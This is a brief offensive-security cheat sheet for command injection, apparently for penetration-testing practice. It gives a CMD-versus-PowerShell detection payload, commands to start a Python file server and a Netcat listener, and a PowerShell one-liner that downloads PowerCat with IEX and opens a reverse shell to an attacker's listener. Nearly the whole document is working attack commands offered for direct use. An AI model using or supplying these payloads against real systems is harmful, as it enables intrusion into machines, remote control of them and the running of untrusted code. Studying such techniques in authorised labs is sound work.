# Command Injection Quick Tips

#### PowerCat Location on Kali

```sh
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps
```

#### Starting a Python Server on port 80

```bash
kali@kali:~$ python3 -m http.server 80
```

#### Starting a Netcat Listener on Port 4444

```bash
kali@kali:~$ nc -nvlp 4444
```

#### Determining Command Execution Environment

To determine if commands are executed by CMD or PowerShell:

```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo Powershell
```

#### To create a reverse shell by downloading PowerCat and connecting to a Netcat listener:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://example.com/powercat.ps1");powercat -c [IP] -p [PORT] -e powershell
```

Replace `[IP]` and `[PORT]` with the appropriate IP address and port number for your Netcat listener.





